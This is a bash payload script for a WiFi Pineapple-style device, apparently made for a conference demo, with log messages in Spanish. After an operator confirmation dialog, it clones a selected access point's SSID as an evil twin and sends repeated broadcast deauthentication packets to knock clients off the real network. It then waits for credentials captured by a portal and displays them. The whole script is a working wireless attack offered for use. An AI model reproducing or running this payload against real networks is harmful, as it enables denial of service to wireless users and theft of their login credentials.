#!/bin/bash
# Title: AV Demo — Deauth & Evil Twin
# Description: Clones target AP SSID, broadcasts Evil Twin, deauths victim clients, polls for captured credentials
# Author: BICSI-CALA 2026 Demo
# Version: 1.0
# Category: recon/access_point
#
# Context: recon/access_point — variables $_RECON_SELECTED_AP_* available
# Deploy to: /mmc/root/payloads/recon/access_point/av_evil_twin/
#
# Sources:
#   - Deauth pattern: user/interception/fenris/payload.sh (HaleHound)
#   - SSID pool API: user/prank/ssid_chaos/payload.sh (RocketGod)

LOOT_DIR="/root/loot/av_demo"
CREDENTIALS_LOG="$LOOT_DIR/credentials.log"
POLL_TIMEOUT=120   # seconds to wait for credentials after deauth
POLL_INTERVAL=3    # seconds between credential log checks
BURST_COUNT=30     # deauth packets per burst
BURST_DELAY=1      # seconds between bursts
NUM_BURSTS=3       # number of broadcast deauth bursts

# ─── Show target info ─────────────────────────────────────────────────────────
LOG ""
LOG "=== AV EVIL TWIN ATTACK ==="
LOG ""
LOG "Target AP:"
LOG "  SSID:    $_RECON_SELECTED_AP_SSID"
LOG "  BSSID:   $_RECON_SELECTED_AP_BSSID"
LOG "  Channel: $_RECON_SELECTED_AP_CHANNEL"
LOG "  Clients: $_RECON_SELECTED_AP_CLIENT_COUNT"
LOG "  Encrypt: $_RECON_SELECTED_AP_ENCRYPTION_TYPE"
LOG ""

# ─── Confirm attack ───────────────────────────────────────────────────────────
resp=$(CONFIRMATION_DIALOG "ATACAR RED AV?\n\nSSID: $_RECON_SELECTED_AP_SSID\nBSSID: $_RECON_SELECTED_AP_BSSID\nCanal: $_RECON_SELECTED_AP_CHANNEL\n\nSe clonará el SSID y se desautenticará a los clientes.")
case $? in
    "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
        LOG "Cancelado."
        exit 0
        ;;
esac

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "Cancelado por el usuario."
    exit 0
fi

# ─── Clone SSID (Evil Twin) ───────────────────────────────────────────────────
LOG "Activando Evil Twin..."
PINEAPPLE_SSID_POOL_CLEAR
sleep 1
PINEAPPLE_SSID_POOL_ADD "$_RECON_SELECTED_AP_SSID"
PINEAPPLE_SSID_POOL_START start
sleep 1
LOG green "Evil Twin activo: $_RECON_SELECTED_AP_SSID"

# ─── Deauth burst ─────────────────────────────────────────────────────────────
LED RED
VIBRATE

LOG ""
LOG "Desautenticando clientes en $_RECON_SELECTED_AP_SSID..."
LOG "  $NUM_BURSTS ráfagas × $BURST_COUNT paquetes broadcast"
LOG ""

burst=1
while [ $burst -le $NUM_BURSTS ]; do
    LOG "  Ráfaga $burst/$NUM_BURSTS..."

    i=0
    while [ $i -lt $BURST_COUNT ]; do
        PINEAPPLE_DEAUTH_CLIENT "$_RECON_SELECTED_AP_BSSID" "FF:FF:FF:FF:FF:FF" "$_RECON_SELECTED_AP_CHANNEL"
        i=$((i + 1))
        sleep 0.1
    done

    burst=$((burst + 1))
    [ $burst -le $NUM_BURSTS ] && sleep $BURST_DELAY
done

LOG ""
LOG green "Deauth completado — víctimas desconectadas"
LOG "El dispositivo víctima debería reconectar automáticamente al Evil Twin."
LOG ""

# ─── Poll for credentials ─────────────────────────────────────────────────────
LED GREEN
LOG "Esperando credenciales... (timeout: ${POLL_TIMEOUT}s)"
LOG ""

elapsed=0
creds_found=false

while [ $elapsed -lt $POLL_TIMEOUT ]; do
    if [ -f "$CREDENTIALS_LOG" ] && [ -s "$CREDENTIALS_LOG" ]; then
        creds_found=true
        break
    fi
    sleep $POLL_INTERVAL
    elapsed=$((elapsed + POLL_INTERVAL))
done

if [ "$creds_found" = true ]; then
    VIBRATE
    VIBRATE
    CREDS=$(cat "$CREDENTIALS_LOG")
    ALERT "CREDENCIALES CAPTURADAS!\n\n$CREDS"
    LOG green "CREDENCIALES CAPTURADAS:"
    LOG green "$CREDS"
else
    LOG yellow "Timeout: no se capturaron credenciales en ${POLL_TIMEOUT}s"
    LOG yellow "El portal sigue activo — check $CREDENTIALS_LOG manualmente"
    ALERT "Timeout: no se capturaron credenciales.\nEl portal sigue activo."
fi

LED WHITE
LOG ""
LOG "Payload 2 completado."

exit 0
